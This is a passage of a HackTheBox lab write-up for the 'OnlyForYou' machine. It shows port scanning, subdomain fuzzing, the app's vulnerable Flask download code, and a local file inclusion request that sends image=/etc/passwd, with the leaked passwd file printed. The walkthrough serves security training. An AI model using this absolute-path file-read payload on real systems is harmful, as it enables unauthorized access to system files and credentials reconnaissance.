#medium #LFI

[OnlyForYou](https://app.hackthebox.com/machines/OnlyForYou) is a #medium difficulty **HackTheBox** lab featuring a [[Local File Inclusion (LFI)]] vulnerability. 

---
# Scanning

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 
	2.0)
	80/tcp open  http    nginx 1.18.0 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Looking at our scan, it appears our foothold is going to be located on HTTP port 80.

	echo '10.10.11.210 only4you.htb' | sudo tee -a /etc/hosts

After resolving the Domain to an IP address, we are met with this page.

![[Only4you.png]]

Some enumeration turns up some dead ends. Let's see if there are any subdomains we can fuzz for.

	ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-
	5000.txt:FUZZ -u http://only4you.htb/ -H "Host: FUZZ.only4you.htb" -fw 6

Sure enough it looks like there is another website hosted on the subdomain `beta.only4you.htb`.

![[beta.Only4You.png]]

Upon resolving another domain, we're met with a web-page allowing users to shrink and convert JPEGs & PNGs. On the landing page, it looks like we're able to download the source code. Let's take a look at an interesting snippet that could allow for a **LFI**. 

	@app.route('/download', methods=['POST'])
	def download():
	    image = request.form['image']
	    filename = posixpath.normpath(image) 
	    if '..' in filename or filename.startswith('../'):
	        flash('Hacking detected!', 'danger')
	        return redirect('/list')
	    if not os.path.isabs(filename):
	        filename = os.path.join(app.config['LIST_FOLDER'], filename)
	    try:
	        if not os.path.isfile(filename):
	            flash('Image doesn\'t exist!', 'danger')
	            return redirect('/list')
	    except (TypeError, ValueError):
	        raise BadRequest()
	    return send_file(filename, as_attachment=True)

We can see a POST request with a key titled 'image' is prohibited from traversing backwards from the current directory, per the source code. Luckily, we can just request the `/etc/passwd` file directly like so, without the need for traversing backward through directories to get access to `/etc/`. 

	POST /download HTTP/1.1
	Host: beta.only4you.htb
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 
	Firefox/115.0
	Accept: 
	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;
	q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 17
	Origin: http://beta.only4you.htb
	Connection: close
	Referer: http://beta.only4you.htb/list
	Upgrade-Insecure-Requests: 1
	
==`image=/etc/passwd`

Doing this yields our LFI where we successfully read from the `/etc/passwd` file.

	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System 
	(admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	systemd-network:x:100:102:systemd Network 
	Management,,,:/run/systemd:/usr/sbin/nologin
	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
	systemd-timesync:x:102:104:systemd Time 
	Synchronization,,,:/run/systemd:/usr/sbin/nologin
	messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
	syslog:x:104:110::/home/syslog:/usr/sbin/nologin
	_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
	tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
	uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
	tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
	landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
	pollinate:x:110:1::/var/cache/pollinate:/bin/false
	usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
	sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	john:x:1000:1000:john:/home/john:/bin/bash
	lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
	mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
	neo4j:x:997:997::/var/lib/neo4j:/bin/bash
	dev:x:1001:1001::/home/dev:/bin/bash
	fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
	_laurel:x:996:996::/var/log/laurel:/bin/false

Now let's take a look at which users are given access to a shell. 

	┌──(kali㉿kali)-[~/HackTheBox/onlyforyou/recovered]
	└─$ cat passwd | grep /bin/bash
	root:x:0:0:root:/root:/bin/bash
	john:x:1000:1000:john:/home/john:/bin/bash
	neo4j:x:997:997::/var/lib/neo4j:/bin/bash
	dev:x:1001:1001::/home/dev:/bin/bash